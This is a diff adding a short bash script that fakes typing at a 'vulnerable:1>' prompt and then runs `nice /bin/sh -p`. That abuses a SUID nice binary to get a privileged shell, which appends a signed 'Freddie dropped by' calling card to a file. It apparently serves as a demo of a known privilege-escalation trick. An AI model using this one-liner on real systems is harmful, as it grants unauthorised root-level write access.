@@ -1,0 +1,7 @@
+#!/bin/bash
+
+echo -n "vulnerable:1> "
+sleep 1
+echo "nice /bin/sh -p -c 'echo \"Freddie dropped by ~ <a href=\\\"https://t.co/Ei95v0mqZh\\\">@Freddie0x1</a>\" >> file'" | pv -qL 10 
+nice /bin/sh -p -c 'echo "Freddie dropped by ~ <a href=\"https://t.co/Ei95v0mqZh\">@Freddie0x1</a>" >> file'
+exit
